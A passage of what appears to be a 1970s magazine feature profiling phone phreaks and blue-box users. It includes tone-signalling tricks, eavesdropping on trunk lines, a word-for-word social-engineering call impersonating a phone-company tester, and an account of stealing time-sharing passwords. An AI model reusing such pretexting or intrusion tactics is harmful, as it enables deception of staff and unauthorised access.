"Oh no.  I don't do that.  I don't think it's right," he told me firmly.  "I
have the power to do it but I don't... Well one time, just one time, I have to
admit that I did.  There was this girl, Linda, and I wanted to find out... you
know.  I tried to call her up for a date. I had a date with her the last
weekend and I thought she liked me.  I called her up, man, and her line was
busy, and I kept calling and it was still busy.  Well, I had just learned about
this system of jumping into lines and I said to myself, 'Hmmm.  Why not just
see if it works. It'll surprise her if all of a sudden I should pop up on her
line. It'll impress her, if anything.'  So I went ahead and did it.  I M-Fed
into the line.  My M-F-er is powerful enough when patched directly into the
mouthpiece to trigger a verification trunk without using an operator the way
the other phone phreaks have to.

"I slipped into the line and there she was talking to another boyfriend.
Making sweet talk to him.  I didn't make a sound because I was so disgusted.
So I waited there for her to hang up, listening to her making sweet talk to the
other guy.  You know.  So as soon as she hung up I instantly M-F-ed her up and
all I said was, 'Linda, we're through.'  And I hung up.  And it blew her head
off.  She couldn't figure out what the hell happened.

"But that was the only time.  I did it thinking I would surprise her, impress
her.  Those were all my intentions were, and well, it really kind of hurt me
pretty badly, and... and ever since then I don't go into verification trunks."

Moments later my first conversation with the Captain comes to a close.

"Listen," he says, his spirits somewhat cheered, "listen.  What you are going
to hear when I hang up is the sound of tandems unstacking. Layer after layer of
tandems unstacking until there's nothing left of the stack, until it melts away
into nothing.  Cheep, cheep, cheep, cheep," he concludes, his voice descending
to a whisper with each cheep.

He hangs up.  The phone suddenly goes into four spasms: kachink cheep. Kachink
cheep kachink cheep kachink cheep, and the complex connection has wiped itself
out like the Cheshire cat's smile.

The MF Boogie Blues

The next number I choose from the select list of phone-phreak alumni, prepared
for me by the blue-box inventor, is a Memphis number.  It is the number of Joe
Engressia, the first and still perhaps the most accomplished blind phone
phreak.

Three years ago Engressia was a nine-day wonder in newspapers and magazines all
over America because he had been discovered whistling free long-distance
connections for fellow students at the University of South Florida.  Engressia
was born with perfect pitch: he could whistle phone tones better than the
phone-company's equipment.

Engressia might have gone on whistling in the dark for a few friends for the
rest of his life if the phone company hadn't decided to expose him.  He was
warned, disciplined by the college, and the whole case became public.  In the
months following media reports of his talent, Engressia began receiving strange
calls.   There were calls from a group of kids in Los Angeles who could do some
very strange things with the quirky General Telephone and Electronics circuitry
in L.A. suburbs.  There were calls from a group of mostly blind kids in ----,
California, who had been doing some interesting experiments with Cap'n Crunch
whistles and test loops.  There was a group in Seattle, a group in Cambridge,
Massachusetts, a few from New York, a few scattered across the country.  Some
of them had already equipped themselves with cassette and electronic M-F
devices.  For some of these groups, it was the first time they knew of the
others.

The exposure of Engressia was the catalyst that linked the separate
phone-phreak centers together.  They all called Engressia.  They talked to him
about what he was doing and what they were doing.  And then he told them -- the
scattered regional centers and lonely independent phone phreakers -- about each
other, gave them each other's numbers to call, and within a year the scattered
phone-phreak centers had grown into a nationwide underground.

Joe Engressia is only twenty-two years old now, but along the phone-phreak
network he is "the old man," accorded by phone phreaks something of the
reverence the phone company bestows on Alexander Graham Bell.  He seldom needs
to make calls anymore.  The phone phreaks all call him and let him know what
new tricks, new codes, new techniques they have learned.  Every night he sits
like a sightless spider in his little apartment receiving messages from every
tendril of his web.  It is almost a point of pride with Joe that they call
him.

But when I reached him in his Memphis apartment that night, Joe Engressia was
lonely, jumpy and upset.

"God, I'm glad somebody called.  I don't know why tonight of all nights I don't
get any calls.  This guy around here got drunk again tonight and propositioned
me again.  I keep telling him we'll never see eye to eye on this subject, if
you know what I mean.  I try to make light of it, you know, but he doesn't get
it.  I can head him out there getting drunker and I don't know what he'll do
next.  It's just that I'm really all alone here, just moved to Memphis, it's
the first time I'm living on my own, and I'd hate for it to all collapse now.
But I won't go to bed with him.  I'm just not very interested in sex and even
if I can't see him I know he's ugly.

"Did you hear that?  That's him banging a bottle against the wall outside.
He's nice.  Well forget about it.  You're doing a story on phone phreaks?
Listen to this.  It's the MF Boogie Blues.

Sure enough, a jumpy version of Muskrat Ramble boogies its way over the line,
each note one of those long-distance phone tones.  The music stops.  A huge
roaring voice blasts the phone off my ear: "AND THE QUESTION IS..." roars the
voice, "CAN A BLIND PERSON HOOK UP AN AMPLIFIER ON HIS OWN?"

The roar ceases.  A high-pitched operator-type voice replaces it. "This is
Southern Braille Tel. & Tel.  Have tone, will phone."

This is succeeded by a quick series of M-F tones, a swift "kachink" and a deep
reassuring voice: "If you need home care, call the visiting-nurses association.
First National time in Honolulu is 4:32 p.m."

Joe back in his Joe voice again: "Are we seeing eye to eye? 'Si, si,' said the
blind Mexican.  Ahem.  Yes.  Would you like to know the weather in Tokyo?"

This swift manic sequence of phone-phreak vaudeville stunts and blind-boy jokes
manages to keep Joe's mind off his tormentor only as long as it lasts.

"The reason I'm in Memphis, the reason I have to depend on that homosexual guy,
is that this is the first time I've been able to live on my own and make phone
trips on my own.  I've been banned from all central offices around home in
Florida, they knew me too well, and at the University some of my fellow
scholars were always harassing me because I was on the dorm pay phone all the
time and making fun of me because of my fat ass, which of course I do have,
it's my physical fatness program, but I don't like to hear it every day, and if
I can't phone trip and I can't phone phreak, I can't imagine what I'd do, I've
been devoting three quarters of my life to it.

"I moved to Memphis because I wanted to be on my own as well as because it has
a Number 5 crossbar switching system and some interesting little independent
phone-company districts nearby and so far they don't seem to know who I am so I
can go on phone tripping, and for me phone tripping is just as important as
phone phreaking."

Phone tripping, Joe explains, begins with calling up a central-office switch
room.  He tells the switchman in a polite earnest voice that he's a blind
college student interested in telephones, and could he perhaps have a guided
tour of the switching station?  Each step of the tour Joe likes to touch and
feel relays, caress switching circuits, switchboards, crossbar arrangements.

So when Joe Engressia phone phreaks he feels his way through the circuitry of
the country garden of forking paths, he feels switches shift, relays shunt,
crossbars swivel, tandems engage and disengage even as he hears -- with perfect
pitch -- his M-F pulses make the entire Bell system dance to his tune.

Just one month ago Joe took all his savings out of his bank and left home, over
the emotional protests of his mother.  "I ran away from home almost," he likes
to say.  Joe found a small apartment house on Union Avenue and began making
phone trips.  He'd take a bus a hundred miles south in Mississippi to see some
old-fashioned Bell equipment still in use in several states, which had been
puzzling.  He'd take a bus three hundred miles to Charlotte, North Carolina, to
look at some brand-new experimental equipment.  He hired a taxi to drive him
twelve miles to a suburb to tour the office of a small phone company with some
interesting idiosyncrasies in its routing system.  He was having the time of
his life, he said, the most freedom and pleasure he had known.

In that month he had done very little long-distance phone phreaking from his
own phone.  He had begun to apply for a job with the phone company, he told me,
and he wanted to stay away from anything illegal.

"Any kind of job will do, anything as menial as the most lowly operator.
That's probably all they'd give me because I'm blind.  Even though I probably
know more than most switchmen.  But that's okay.  I want to work for Ma Bell.
I don't hate Ma Bell the way Gilbertson and some phone phreaks do.  I don't
want to screw Ma Bell.  With me it's the pleasure of pure knowledge.  There's
something beautiful about the system when you know it intimately the way I do.
But I don't know how much they know about me here.  I have a very intuitive
feel for the condition of the line I'm on, and I think they're monitoring me
off and on lately, but I haven't been doing much illegal.  I have to make a few
calls to switchmen once in a while which aren't strictly legal, and once I took
an acid trip and was having these auditory hallucinations as if I were trapped
and these planes were dive-bombing me, and all of sudden I had to phone phreak
out of there.  For some reason I had to call Kansas City, but that's all."

A Warning Is Delivered

At this point -- one o'clock in my time zone -- a loud knock on my motel-room
door interrupts our conversation.  Outside the door I find a uniformed security
guard who informs me that there has been an "emergency phone call" for me while
I have been on the line and that the front desk has sent him up to let me
know.

Two seconds after I say good-bye to Joe and hang up, the phone rings.

"Who were you talking to?" the agitated voice demands.  The voice belongs to
Captain Crunch.  "I called because I decided to warn you of something.  I
decided to warn you to be careful.  I don't want this information you get to
get to the radical underground.  I don't want it to get into the wrong hands.
What would you say if I told you it's possible for three phone phreaks to
saturate the phone system of the nation.  Saturate it.  Busy it out.  All of
it.  I know how to do this.  I'm not gonna tell.  A friend of mine has already
saturated the trunks between Seattle and New York.  He did it with a
computerized M-F-er hitched into a special Manitoba exchange.  But there are
other, easier ways to do it."

Just three people?  I ask.  How is that possible?

"Have you ever heard of the long-lines guard frequency?  Do you know about
stacking tandems with 17 and 2600?  Well, I'd advise you to find out about it.
I'm not gonna tell you.  But whatever you do, don't let this get into the hands
of the radical underground."

(Later Gilbertson, the inventor, confessed that while he had always been
skeptical about the Captain's claim of the sabotage potential of trunk-tying
phone phreaks, he had recently heard certain demonstrations which convinced him
the Captain was not speaking idly. "I think it might take more than three
people, depending on how many machines like Captain Crunch's were available.
But even though the Captain sounds a little weird, he generally turns out to
know what he's talking about.")

"You know," Captain Crunch continues in his admonitory tone, "you know the
younger phone phreaks call Moscow all the time.  Suppose everybody were to call
Moscow.  I'm no right-winger.  But I value my life.  I don't want the Commies
coming over and dropping a bomb on my head. That's why I say you've got to be
careful about who gets this information."

The Captain suddenly shifts into a diatribe against those phone phreaks who
don't like the phone company.

"They don't understand, but Ma Bell knows everything they do.  Ma Bell knows.
Listen, is this line hot?  I just heard someone tap in.  I'm not paranoid, but
I can detect things like that.  Well, even if it is, they know that I know that
they know that I have a bulk eraser.  I'm very clean."  The Captain pauses,
evidently torn between wanting to prove to the phone-company monitors that he
does nothing illegal, and the desire to impress Ma Bell with his prowess.  "Ma
Bell knows how good I am.  And I am quite good.  I can detect reversals, tandem
switching, everything that goes on on a line.  I have relative pitch now.  Do
you know what that means?  My ears are a $20,000 piece of equipment.  With my
ears I can detect things they can't hear with their equipment.  I've had
employment problems.  I've lost jobs.  But I want to show Ma Bell how good I
am.  I don't want to screw her, I want to work for her.  I want to do good for
her.  I want to help her get rid of her flaws and become perfect.  That's my
number-one goal in life now."  The Captain concludes his warnings and tells me
he has to be going.  "I've got a little action lined up for tonight," he
explains and hangs up.

Before I hang up for the night, I call Joe Engressia back.  He reports that his
tormentor has finally gone to sleep -- "He's not blind drunk, that's the way I
get, ahem, yes; but you might say he's in a drunken stupor."  I make a date to
visit Joe in Memphis in two days.

A Phone Phreak Call Takes Care of Business

The next morning I attend a gathering of four phone phreaks in  ----- (a
California suburb).  The gathering takes place in a comfortable split-level
home in an upper-middle-class subdivision.  Heaped on the kitchen table are the
portable cassette recorders, M-F cassettes, phone patches, and line ties of the
four phone phreaks present.  On the kitchen counter next to the telephone is a
shoe-box-size blue box with thirteen large toggle switches for the tones.  The
parents of the host phone phreak, Ralph, who is blind, stay in the living room
with their sighted children.  They are not sure exactly what Ralph and his
friends do with the phone or if it's strictly legal, but he is blind and they
are pleased he has a hobby which keeps him busy.

The group has been working at reestablishing the historic "2111" conference,
reopening some toll-free loops, and trying to discover the dimensions of what
seem to be new initiatives against phone phreaks by phone-company security
agents.

It is not long before I get a chance to see, to hear, Randy at work. Randy is
known among the phone phreaks as perhaps the finest con man in the game.  Randy
is blind.  He is pale, soft and pear-shaped, he wears baggy pants and a wrinkly
nylon white sport shirt, pushes his head forward from hunched shoulders
somewhat like a turtle inching out of its shell.  His eyes wander, crossing and
recrossing, and his forehead is somewhat pimply.  He is only sixteen years
old.

But when Randy starts speaking into a telephone mouthpiece his voice becomes so
stunningly authoritative it is necessary to look again to convince yourself it
comes from a chubby adolescent Randy.  Imagine the voice of a crack oil-rig
foreman, a tough, sharp, weather-beaten Marlboro man of forty.  Imagine the
voice of a brilliant performance-fund gunslinger explaining how he beats the
Dow Jones by thirty percent.  Then imagine a voice that could make those two
sound like Stepin Fetchit.  That is sixteen-year-old Randy's voice.

He is speaking to a switchman in Detroit.  The phone company in Detroit had
closed up two toll-free loop pairs for no apparent reason, although heavy use
by phone phreaks all over the country may have been detected.  Randy is telling
the switchman how to open up the loop and make it free again:

"How are you, buddy.  Yeah. I'm on the board in here in Tulsa, Oklahoma, and
we've been trying to run some tests on your loop-arounds and we find'em busied
out on both sides.... Yeah, we've been getting a 'BY' on them, what d'ya say,
can you drop cards on 'em?  Do you have 08 on your number group?  Oh that's
okay, we've had this trouble before, we may have to go after the circuit.  Here
lemme give 'em to you: your frame is 05, vertical group 03, horizontal 5,
vertical file 3.  Yeah, we'll hang on here.... Okay, found it?  Good.  Right,
yeah, we'd like to clear that busy out.  Right.  All you have to do is look for
your key on the mounting plate, it's in your miscellaneous trunk frame.  Okay?
Right.  Now pull your key from NOR over the LCT.  Yeah. I don't know why that
happened, but we've been having trouble with that one.  Okay.  Thanks a lot
fella.  Be seein' ya."

Randy hangs up, reports that the switchman was a little inexperienced with the
loop-around circuits on the miscellaneous trunk frame, but that the loop has
been returned to its free-call status.

Delighted, phone phreak Ed returns the pair of numbers to the active-status
column in his directory.  Ed is a superb and painstaking researcher.  With
almost Talmudic thoroughness he will trace tendrils of hints through soft-wired
mazes of intervening phone-company circuitry back through complex linkages of
switching relays to find the location and identity of just one toll-free loop.
He spends hours and hours, every day, doing this sort of thing.  He has somehow
compiled a directory of eight hundred "Band-six in-WATS numbers" located in
over forty states.  Band-six in-WATS numbers are the big 800 numbers -- the
ones that can be dialed into free from anywhere in the country.

Ed the researcher, a nineteen-year-old engineering student, is also a superb
technician.  He put together his own working blue box from scratch at age
seventeen.  (He is sighted.)  This evening after distributing the latest issue
of his in-WATS directory (which has been typed into Braille for the blind phone
phreaks), he announces he has made a major new breakthrough:

"I finally tested it and it works, perfectly. I've got this switching matrix
which converts any touch-tone phone into an M-F-er."

The tones you hear in touch-tone phones are not the M-F tones that operate the
long-distance switching system.  Phone phreaks believe A.T.&T. had deliberately
equipped touch tones with a  different set of frequencies to avoid putting the
six master M-F tones in the hands of every touch-tone owner.  Ed's complex
switching matrix puts the six master tones, in effect put a blue box, in the
hands of every touch-tone owner.

Ed shows me pages of schematics, specifications and parts lists. "It's not easy
to build, but everything here is in the Heathkit catalog."

Ed asks Ralph what progress he has made in his attempts to reestablish a
long-term open conference line for phone phreaks.  The last big conference --
the historic "2111" conference -- had been arranged through an unused Telex
test-board trunk somewhere in the innards of a 4A switching machine in
Vancouver, Canada.  For months phone phreaks could M-F their way into
Vancouver, beep out 604 (the Vancouver area code) and then beep out 2111 (the
internal phone-company code for Telex testing), and find themselves at any
time, day or night, on an open wire talking with an array of phone phreaks from
coast to coast, operators from Bermuda, Tokyo and London who are phone-phreak
sympathizers, and miscellaneous guests and technical experts.  The conference
was a massive exchange of information.  Phone phreaks picked each other's
brains clean, then developed new ways to pick the phone company's brains clean.
Ralph gave M F Boogies concerts with his home-entertainment-type electric
organ, Captain Crunch demonstrated his round-the-world prowess with his
notorious computerized unit and dropped leering hints of the "action" he was
getting with his girl friends.  (The Captain lives out or pretends to live out
several kinds of fantasies to the gossipy delight of the blind phone phreaks
who urge him on to further triumphs on behalf of all of them.)  The somewhat
rowdy Northwest phone-phreak crowd let their bitter internal feud spill over
into the peaceable conference line, escalating shortly into guerrilla warfare;
Carl the East Coast international tone relations expert demonstrated newly
opened direct M-F routes to central offices on the island of Bahrein in the
Persian Gulf, introduced a new phone-phreak friend of his in Pretoria, and
explained the technical operation of the new Oakland-to Vietnam linkages.
(Many phone phreaks pick up spending money by M-F-ing calls from relatives to
Vietnam G.I.'s, charging $5 for a whole hour of trans-Pacific conversation.)

Day and night the conference line was never dead.  Blind phone phreaks all over
the country, lonely and isolated in homes filled with active sighted brothers
and sisters, or trapped with slow and unimaginative blind kids in straitjacket
schools for the blind, knew that no matter how late it got they could dial up
the conference and find instant electronic communion with two or three other
blind kids awake over on the other side of America.  Talking together on a
phone hookup, the blind phone phreaks say, is not much different from being
there together. Physically, there was nothing more than a two-inch-square wafer
of titanium inside a vast machine on Vancouver Island.  For the blind kids
>there< meant an exhilarating feeling of being in touch, through a kind of
skill and magic which was peculiarly their own.

Last April 1, however, the long Vancouver Conference was shut off. The phone
phreaks knew it was coming.  Vancouver was in the process of converting from a
step-by-step system to a 4A machine and the 2111 Telex circuit was to be wiped
out in the process.  The phone phreaks learned the actual day on which the
conference would be erased about a week ahead of time over the phone company's
internal-news-and-shop-talk recording.

For the next frantic seven days every phone phreak in America was on and off
the 2111 conference twenty-four hours a day.  Phone phreaks who were just
learning the game or didn't have M-F capability were boosted up to the
conference by more experienced phreaks so they could get a glimpse of what it
was like before it disappeared.  Top phone phreaks searched distant area codes
for new conference possibilities without success.  Finally in the early morning
of April 1, the end came.

"I could feel it coming a couple hours before midnight," Ralph remembers.  "You
could feel something going on in the lines.  Some static began showing up, then
some whistling wheezing sound.  Then there were breaks.  Some people got cut
off and called right back in, but after a while some people were finding they
were cut off and couldn't get back in at all.  It was terrible.  I lost it
about one a.m., but managed to slip in again and stay on until the thing
died... I think it was about four in the morning.  There were four of us still
hanging on when the conference disappeared into nowhere for good.  We all tried
to M-F up to it again of course, but we got silent termination.  There was
nothing there."

The Legendary Mark Bernay Turns Out To Be "The Midnight Skulker"

Mark Bernay.  I had come across that name before.  It was on Gilbertson's
select list of phone phreaks.  The California phone phreaks had spoken of a
mysterious Mark Bernay as perhaps the first and oldest phone phreak on the West
Coast.  And in fact almost every phone phreak in the West can trace his origins
either directly to Mark Bernay or to a disciple of Mark Bernay.

It seems that five years ago this Mark Bernay (a pseudonym he chose for
himself) began traveling up and down the West Coast pasting tiny stickers in
phone books all along his way.  The stickers read something like "Want to hear
an interesting tape recording? Call these numbers."  The numbers that followed
were toll-free loop-around pairs. When one of the curious called one of the
numbers he would hear a tape recording pre-hooked into the loop by Bernay which
explained the use of loop-around pairs, gave the numbers of several more, and
ended by telling the caller, "At six o'clock tonight this recording will stop
and you and your friends can try it out.  Have fun."

"I was disappointed by the response at first," Bernay told me, when I finally
reached him at one of his many numbers and he had dispensed with the usual "I
never do anything illegal" formalities which experienced phone phreaks open
most conversations.

"I went all over the coast with these stickers not only on pay phones, but I'd
throw them in front of high schools in the middle of the night, I'd leave them
unobtrusively in candy stores, scatter them on main streets of small towns.  At
first hardly anyone bothered to try it out.  I would listen in for hours and
hours after six o'clock and no one came on.  I couldn't figure out why people
wouldn't be interested.  Finally these two girls in Oregon tried it out and
told all their friends and suddenly it began to spread."

Before his Johny Appleseed trip Bernay had already gathered a sizable group of
early pre-blue-box phone phreaks together on loop-arounds in Los Angeles.
Bernay does not claim credit for the original discovery of the loop-around
numbers.  He attributes the discovery to an eighteen-year-old reform school kid
in Long Beach whose name he forgets and who, he says, "just disappeared one
day."  When Bernay himself discovered loop-arounds independently, from clues in
his readings in old issues of the Automatic Electric Technical Journal, he
found dozens of the reform-school kid's friends already using them. However, it
was one of Bernay's disciples in Seattle that introduced phone phreaking to
blind kids.  The Seattle kid who learned about loops through Bernay's recording
told a blind friend, the blind kid taught the secret to his friends at a winter
camp for blind kids in Los Angeles.  When the camp session was over these kids
took the secret back to towns all over the West.  This is how the original
blind kids became phone phreaks.  For them, for most phone phreaks in general,
it was the discovery of the possibilities of loop-arounds which led them on to
far more serious and sophisticated phone-phreak methods, and which gave them a
medium for sharing their discoveries.

A year later a blind kid who moved back east brought the technique to a blind
kids' summer camp in Vermont, which spread it along the East Coast.  All from a
Mark Bernay sticker.

Bernay, who is nearly thirty years old now, got his start when he was fifteen
and his family moved into an L.A. suburb serviced by General Telephone and
Electronics equipment.  He became fascinated with the differences between Bell
and G.T.&E. equipment.  He learned he could make interesting things happen by
carefully timed clicks with the disengage button.  He learned to interpret
subtle differences in the array of clicks, whirrs and kachinks he could hear on
his lines.  He learned he could shift himself around the switching relays of
the L.A. area code in a not-too-predictable fashion by interspersing his own
hook-switch clicks with the clicks within the line. (Independent phone
companies -- there are nineteen hundred of them still left, most of them tiny
island principalities in Ma Bell's vast empire -- have always been favorites
with phone phreaks, first as learning tools, then as Archimedes platforms from
which to manipulate the huge Bell system.  A phone phreak in Bell territory
will often M-F himself into an independent's switching system, with switching
idiosyncrasies which can give him marvelous leverage over the Bell System.

"I have a real affection for Automatic Electric Equipment," Bernay told me.
"There are a lot of things you can play with.  Things break down in interesting
ways."

Shortly after Bernay graduated from college (with a double major in chemistry
and philosophy), he graduated from phreaking around with G.T.&E. to the Bell
System itself, and made his legendary sticker-pasting journey north along the
coast, settling finally in Northwest Pacific Bell territory.  He discovered
that if Bell does not break down as interestingly as G.T.&E., it nevertheless
offers a lot of "things to play with."

Bernay learned to play with blue boxes.  He established his own personal
switchboard and phone-phreak research laboratory complex.  He continued his
phone-phreak evangelism with ongoing sticker campaigns. He set up two recording
numbers, one with instructions for beginning phone phreaks, the other with
latest news and technical developments (along with some advanced instruction)
gathered from sources all over the country.

These days, Bernay told me, he had gone beyond phone-phreaking itself. "Lately
I've been enjoying playing with computers more than playing with phones.  My
personal thing in computers is just like with phones, I guess -- the kick is in
finding out how to beat the system, how to get at things I'm not supposed to
know about, how to do things with the system that I'm not supposed to be able
to do."

As a matter of fact, Bernay told me, he had just been fired from his
computer-programming job for doing things he was not supposed to be able to do.
he had been working with a huge time-sharing computer owned by a large
corporation but shared by many others.  Access to the computer was limited to
those programmers and corporations that had been assigned certain passwords.
And each password restricted its user to access to only the one section of the
computer cordoned off from its own information storager.  The password system
prevented companies and individuals from stealing each other's information.

"I figured out how to write a program that would let me read everyone else's
password," Bernay reports.  "I began playing around with passwords.  I began
letting the people who used the computer know, in subtle ways, that I knew
their passwords.  I began dropping notes to the computer supervisors with hints
that I knew what I know. I signed them 'The Midnight Skulker.'  I kept getting
cleverer and cleverer with my messages and devising ways of showing them what I
could do. I'm sure they couldn't imagine I could do the things I was showing
them.  But they never responded to me.  Every once in a while they'd change the
passwords, but I found out how to discover what the new ones were, and I let
them know.  But they never responded directly to the Midnight Skulker.  I even
finally designed a program which they could use to prevent my program from
finding out what it did.  In effect I told them how to wipe me out, The
Midnight Skulker.  It was a very clever program.  I started leaving clues about
myself.  I wanted them to try and use it and then try to come up with something
to get around that and reappear again.  But they wouldn't play.  I wanted to
get caught.  I mean I didn't want to get caught personally, but I wanted them
to notice me and admit that they noticed me.  I wanted them to attempt to
respond, maybe in some interesting way."
Finally the computer managers became concerned enough about the threat of
information-stealing to respond.  However, instead of using The Midnight
Skulker's own elegant self-destruct program, they called in their security
personnel, interrogated everyone, found an informer to identify Bernay as The
Midnight Skulker, and fired him.

"At first the security people advised the company to hire me full-time to
search out other flaws and discover other computer freaks.  I might have liked
that.  But I probably would have turned into a double double agent rather than
the double agent they wanted.  I might have resurrected The Midnight Skulker
and tried to catch myself.  Who knows?  Anyway, the higher-ups turned the whole
idea down."

You Can Tap the F.B.I.'s Crime Control Computer in the Comfort of Your Own
Home, Perhaps

Computer freaking may be the wave of the future.  It suits the phone-phreak
sensibility perfectly.  Gilbertson, the blue-box inventor and a lifelong phone
phreak, has also gone on from phone-phreaking to computer-freaking.  Before he
got into the blue-box business Gilbertson, who is a highly skilled programmer,
devised programs for international currency arbitrage.

But he began playing with computers in earnest when he learned he could use his
blue box in tandem with the computer terminal installed in his apartment by the
instrumentation firm he worked for.  The print-out terminal and keyboard was
equipped with acoustical coupling, so that by coupling his little ivory
Princess phone to the terminal and then coupling his blue box on that, he could
M-F his way into other computers with complete anonymity, and without charge;
program and re-program them at will; feed them false or misleading information;
tap and steal from them.  He explained to me that he taps computers by busying
out all the lines, then going into a verification trunk, listening into the
passwords and instructions one of the time sharers uses, and them M-F-ing in
and imitating them.  He believes it would not be impossible to creep into the
F.B.I's crime control computer through a local police computer terminal and
phreak around with the F.B.I.'s memory banks.  He claims he has succeeded in
re-programming a certain huge institutional computer in such a way that it has
cordoned off an entire section of its circuitry for his personal use, and at
the same time conceals that arrangement from anyone else's notice.  I have been
unable to verify this claim.

Like Captain Crunch, like Alexander Graham Bell (pseudonym of a
disgruntled-looking East Coast engineer who claims to have invented the black
box and now sells black and blue boxes to gamblers and radical heavies), like
most phone phreaks, Gilbertson began his career trying to rip off pay phones as
a teenager.  Figure them out, then rip them off.  Getting his dime back from
the pay phone is the phone phreak's first thrilling rite of passage.  After
learning the usual eighteen different ways of getting his dime back, Gilbertson
learned how to make master keys to coin-phone cash boxes, and get everyone
else's dimes back.  He stole some phone-company equipment and put together his
own home switchboard with it.  He learned to make a simple "bread-box" device,
of the kind used by bookies in the Thirties (bookie gives a number to his
betting clients; the phone with that number is installed in some widow lady's
apartment, but is rigged to ring in the bookie's shop across town, cops trace
big betting number and find nothing but the widow).

Not long after that afternoon in 1968 when, deep in the stacks of an
engineering library, he came across a technical journal with the phone tone
frequencies and rushed off to make his first blue box, not long after that
Gilbertson abandoned a very promising career in physical chemistry and began
selling blue boxes for $1,500 apiece.

"I had to leave physical chemistry.  I just ran out of interesting things to
learn," he told me one evening.  We had been talking in the apartment of the
man who served as the link between Gilbertson and the syndicate in arranging
the big $300,000 blue-box deal which fell through because of legal trouble.
There has been some smoking.

"No more interesting things to learn," he continues.  "Physical chemistry turns
out to be a sick subject when you take it to its highest level.  I don't know.
I don't think I could explain to you how it's sick.  You have to be there.  But
you get, I don't know, a false feeling of omnipotence.  I suppose it's like
phone-phreaking that way.  This huge thing is there.  This whole system.  And
there are holes in it and you slip into them like Alice and you're pretending
you're doing something you're actually not, or at least it's no longer you
that's doing what you thought you were doing.  It's all Lewis Carroll.
Physical chemistry and phone-phreaking.  That's why you have these phone-phreak
pseudonyms like The Cheshire Cat, the Red King, and The Snark.  But there's
something about phone-phreaking that you don't find in physical chemistry."  He
looks up at me:

"Did you ever steal anything?"

"Well yes, I..."

"Then you know!  You know the rush you get.  It's not just knowledge, like
physical chemistry.  It's forbidden knowledge.  You know.  You can learn about
anything under the sun and be bored to death with it. But the idea that it's
illegal.  Look: you can be small and mobile and smart and you're ripping off
somebody large and powerful and very dangerous."

People like Gilbertson and Alexander Graham Bell are always talking about
ripping off the phone company and screwing Ma Bell.  But if they were shown a
single button and told that by pushing it they could turn the entire circuitry
of A.T.&T. into molten puddles, they probably wouldn't push it.  The
disgruntled-inventor phone phreak needs the phone system the way the lapsed
Catholic needs the Church, the way Satan needs a God, the way The Midnight
Skulker needed, more than anything else, response.

Later that evening Gilbertson finished telling me how delighted he was at the
flood of blue boxes spreading throughout the country, how delighted he was to
know that "this time they're really screwed."  He suddenly shifted gears.

"Of course.  I do have this love/hate thing about Ma Bell.  In a way I almost
like the phone company.  I guess I'd be very sad if they were to disintegrate.
In a way it's just that after having been so good they turn out to have these
things wrong with them.  It's those flaws that allow me to get in and mess with
them, but I don't know.  There's something about it that gets to you and makes
you want to get to it, you know."

I ask him what happens when he runs out of interesting, forbidden things to
learn about the phone system.

"I don't know, maybe I'd go to work for them for a while."

"In security even?"

"I'd do it, sure.  I just as soon play -- I'd just as soon work on either
side."

"Even figuring out how to trap phone phreaks? I said, recalling Mark Bernay's
game."

"Yes, that might be interesting.  Yes, I could figure out how to outwit the
phone phreaks.  Of course if I got too good at it, it might become boring
again.  Then I'd have to hope the phone phreaks got much better and outsmarted
me for a while.  That would move the quality of the game up one level.  I might
even have to help them out, you know, 'Well, kids, I wouldn't want this to get
around but did you ever think of -- ?' I could keep it going at higher and
higher levels forever."

The dealer speaks up for the first time.  He has been staring at the soft
blinking patterns of light and colors on the translucent tiled wall facing him.
(Actually there are no patterns: the color and illumination of every tile is
determined by a computerized random-number generator designed by Gilbertson
which insures that there can be no meaning to any sequence of events in the
tiles.)

"Those are nice games you're talking about," says the dealer to his friend.
"But I wouldn't mind seeing them screwed.  A telephone isn't private anymore.
You can't say anything you really want to say on a telephone or you have to go
through that paranoid bullshit.  'Is it cool to talk on the phone?' I mean,
even if it is cool, if you have to ask 'Is it cool,' then it isn't cool.  You
know.  'Is it cool,' then it isn't cool.  You know.  Like those blind kids,
people are going to start putting together their own private telephone
companies if they want to really talk.  And you know what else.  You don't hear
silences on the phone anymore.  They've got this time-sharing thing on
long-distance lines where you make a pause and they snip out that piece of time
and use it to carry part of somebody else's conversation.  Instead of a pause,
where somebody's maybe breathing or sighing, you get this blank hole and you
only start hearing again when someone says a word and even the beginning of the
word is clipped off. Silences don't count -- you're paying for them, but they
take them away from you.  It's not cool to talk and you can't hear someone when
they don't talk.  What the hell good is the phone?  I wouldn't mind seeing them
totally screwed."

The Big Memphis Bust

Joe Engressia never wanted to screw Ma Bell.  His dream had always been to work
for her.

The day I visited Joe in his small apartment on Union Avenue in Memphis, he was
upset about another setback in his application for a telephone job.

"They're stalling on it.  I got a letter today telling me they'd have to
postpone the interview I requested again.  My landlord read it for me.  They
gave me some runaround about wanting papers on my rehabilitation status but I
think there's something else going on."

When I switched on the 40-watt bulb in Joe's room -- he sometimes forgets when
he has guests -- it looked as if there was enough telephone hardware to start a
small phone company of his own.

There is one phone on top of his desk, one phone sitting in an open drawer
beneath the desk top.  Next to the desk-top phone is a cigar-box-size M-F
device with big toggle switches, and next to that is some kind of switching and
coupling device with jacks and alligator plugs hanging loose.  Next to that is
a Braille typewriter.  On the floor next to the desk, lying upside down like a
dead tortoise, is the half-gutted body of an old black standard phone.  Across
the room on a torn and dusty couch are two more phones, one of them a
touch-tone model; two tape recorders; a heap of phone patches and cassettes,
and a life-size toy telephone.

Our conversation is interrupted every ten minutes by phone phreaks from all
over the country ringing Joe on just about every piece of equipment but the toy
phone and the Braille typewriter.  One fourteen-year-old blind kid from
Connecticut calls up and tells Joe he's got a girl friend.  He wants to talk to
Joe about girl friends. Joe says they'll talk later in the evening when they
can be alone on the line.  Joe draws a deep breath, whistles him off the air
with an earsplitting 2600-cycle whistle. Joe is pleased to get the calls but he
looked worried and preoccupied that evening, his brow constantly furrowed over
his dark wandering eyes.  In addition to the phone-company stall, he has just
learned that his apartment house is due to be demolished in sixty days for
urban renewal.  For all its shabbiness, the Union Avenue apartment house has
been Joe's first home-of-his-own and he's worried that he may not find another
before this one is demolished.

But what really bothers Joe is that switchmen haven't been listening to him.
"I've been doing some checking on 800 numbers lately, and I've discovered that
certain 800 numbers in New Hampshire couldn't be reached from Missouri and
Kansas.  Now it may sound like a small thing, but I don't like to see sloppy
work; it makes me feel bad about the lines.  So I've been calling up switching
offices and reporting it, but they haven't corrected it.  I called them up for
the third time today and instead of checking they just got mad.  Well, that
gets me mad.  I mean, I do try to help them.  There's something about them I
can't understand -- you want to help them and they just try to say you're
defrauding them."

